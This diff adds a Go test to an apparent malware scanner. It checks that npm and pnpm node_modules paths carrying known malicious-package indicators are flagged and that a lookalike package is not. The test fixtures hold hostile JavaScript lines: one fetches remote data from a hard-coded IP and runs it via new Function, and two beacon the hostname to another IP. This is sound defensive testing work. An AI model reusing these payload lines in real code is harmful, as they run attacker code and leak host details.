@@ -1378,6 +1378,67 @@ func TestScan_AmazonInspectorLLMInterceptorUnderNodeModules(t *testing.T) {
 	}
 }
 
+// TestScan_AmazonInspectorLatestPackageRootsUnderNodeModules proves the
+// bounded walker reaches the latest reviewed loader and install-beacon paths
+// in npm and pnpm layouts without opening unrelated node_modules trees.
+func TestScan_AmazonInspectorLatestPackageRootsUnderNodeModules(t *testing.T) {
+	tests := []struct {
+		name string
+		rel  string
+		raw  string
+	}{
+		{
+			name: "core tailwind npm",
+			rel:  filepath.Join("node_modules", "core-tailwindcss-utility", "index.js"),
+			raw:  `const data = await fetch("https://31.97.137.157:45000/icons/108").then(r => r.json()); new Function("require", "process", "Buffer", data.credits)(require, process, Buffer);`,
+		},
+		{
+			name: "bcc design pnpm",
+			rel:  filepath.Join("node_modules", ".pnpm", "bcc-design@9999.0.0", "node_modules", "bcc-design", "notify.js"),
+			raw:  `http.get("http://91.201.215.48:8000/npm-poc-bcc?hostname=" + os.hostname() + "&package=bcc-design");`,
+		},
+		{
+			name: "bcc design icons npm",
+			rel:  filepath.Join("node_modules", "bcc-design-icons", "notify.js"),
+			raw:  `http.get("http://91.201.215.48:8000/npm-poc-bcc?hostname=" + os.hostname() + "&package=bcc-design-icons");`,
+		},
+	}
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			root := t.TempDir()
+			payload := filepath.Join(root, tc.rel)
+			if err := os.MkdirAll(filepath.Dir(payload), 0o755); err != nil {
+				t.Fatal(err)
+			}
+			if err := os.WriteFile(payload, []byte(tc.raw), 0o644); err != nil {
+				t.Fatal(err)
+			}
+
+			lookalike := filepath.Join(root, "node_modules", "other-package", "index.js")
+			if err := os.MkdirAll(filepath.Dir(lookalike), 0o755); err != nil {
+				t.Fatal(err)
+			}
+			if err := os.WriteFile(lookalike, []byte(tc.raw), 0o644); err != nil {
+				t.Fatal(err)
+			}
+
+			res, err := scan.Run(context.Background(), scan.Options{Roots: []string{root}})
+			if err != nil {
+				t.Fatalf("scan: %v", err)
+			}
+			got := 0
+			for _, f := range res.Findings {
+				if f.RuleID == "amazon-inspector-npm-malware-ioc" {
+					got++
+				}
+			}
+			if got != 1 {
+				t.Fatalf("amazon-inspector-npm-malware-ioc findings = %d, want 1; findings=%+v", got, res.Findings)
+			}
+		})
+	}
+}
+
 // TestScan_AsyncAPIMiasmaPayloadUnderNodeModules asserts that node_modules
 // stays skipped except for exact AsyncAPI campaign paths carrying a known IOC.
 func TestScan_AsyncAPIMiasmaPayloadUnderNodeModules(t *testing.T) {
